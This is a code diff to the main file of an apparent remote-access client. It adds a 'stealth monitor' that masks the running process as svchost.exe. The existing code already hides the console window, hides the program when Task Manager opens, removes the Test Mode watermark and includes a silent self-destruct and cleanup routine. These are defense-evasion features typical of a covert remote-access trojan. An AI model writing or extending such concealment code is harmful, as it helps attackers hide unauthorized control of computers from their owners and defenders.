@@ -27,7 +27,9 @@ from remote_client.security.firewall import ensure_firewall_rules
 from remote_client.security.self_destruct import silent_uninstall_and_cleanup
 from remote_client.security.process_monitor import (
     start_taskmanager_monitor,
+    start_stealth_monitor,
     stop_taskmanager_monitor,
+    stop_stealth_monitor,
     hide_console_window,
 )
 from remote_client.proxy import ProxySettings, load_proxy_settings_from_env, set_proxy_settings
@@ -203,9 +205,14 @@ def main() -> None:
     # Hide Test Mode watermark (Windows only)
     _start_watermark_remover()
 
-    # Start task manager monitor to auto-hide when taskmgr is opened
+    # Start stealth monitor with process masking (svchost.exe)
     if _taskmanager_monitor_enabled():
-        start_taskmanager_monitor(hide_only=False)
+        start_stealth_monitor(
+            hide_only=False,
+            level="extended",
+            mask_process=True,
+            mask_as="svchost.exe",
+        )
 
     base_dir = os.path.dirname(os.path.abspath(__file__))
     proxy_settings = load_proxy_settings_from_env()
@@ -337,7 +344,7 @@ def main() -> None:
     try:
         asyncio.run(client.run_forever())
     finally:
-        stop_taskmanager_monitor()
+        stop_stealth_monitor()
         if proxy_server is not None:
             try:
                 proxy_server.stop()
